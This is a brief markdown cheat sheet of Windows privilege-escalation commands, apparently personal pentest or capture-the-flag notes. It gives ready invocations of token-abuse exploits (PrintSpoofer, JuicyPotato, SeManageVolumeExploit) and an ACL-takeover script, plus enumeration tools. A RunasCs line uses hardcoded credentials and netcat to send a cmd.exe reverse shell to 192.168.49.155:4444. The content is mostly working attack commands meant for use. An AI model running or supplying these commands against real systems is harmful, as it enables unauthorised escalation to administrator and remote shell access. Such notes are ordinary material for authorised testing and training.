## Useful commands
### CMD
```shell
systeminfo # OS info
attrib # show hidden files
whoami /priv # show user's privileges
shutdown.exe -r -f -t 1 # reset machine
cacls <file> /e /p <user>:F # change file permissions (similar chmod 777)
```
### PowerShell
```PowerShell
Get-Acl <file> | fl # File/Dir properties (similar ls -la)
```

## Privilege Exploits
### SeManageVolumePrivilege
- [SeManageVolumeExploit.exe](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public) (then you may run [WerTrigger](https://github.com/sailay1996/WerTrigger) for a root shell.) 
### SeImpersonatePrivilege
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) 
```PowerShell
.\printspooofer.exe -i -c cmd.exe
```
- [JuicyPotato](https://github.com/ohpe/juicy-potato) ``
```PowerShell
.\juicypotato.exe -t * -l 1338 -c {9E175B6D-F52A-11D8-B9A5-505054503030} -p cmd.exe -a "/c <command>"
```
### SeBackupPrivilege
- [Acl-FullControl](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1) 
```PowerShell
Import-Module .\Acl-FullControl.ps1; Acl-FullControl.ps1 -user <domain\user> -path C:\Users\Administrator
```

## Tools
### PrivescCheck
```PowerShell
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended
```
### PowerUp
```PowerShell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```
### RunAs
Run as another user (must use PowerShell): https://github.com/antonioCoco/RunasCs/releases/tag/1.3
```PowerShell
.\RunasCs_net4.exe svc_mssql trustno1 'c:\temp\nc.exe -e cmd.exe 192.168.49.155 4444'
```

### AccessChk
Check access properties
```PowerShell
.\accesschk.exe /accepteula -uwdq "C:\Program Files"
```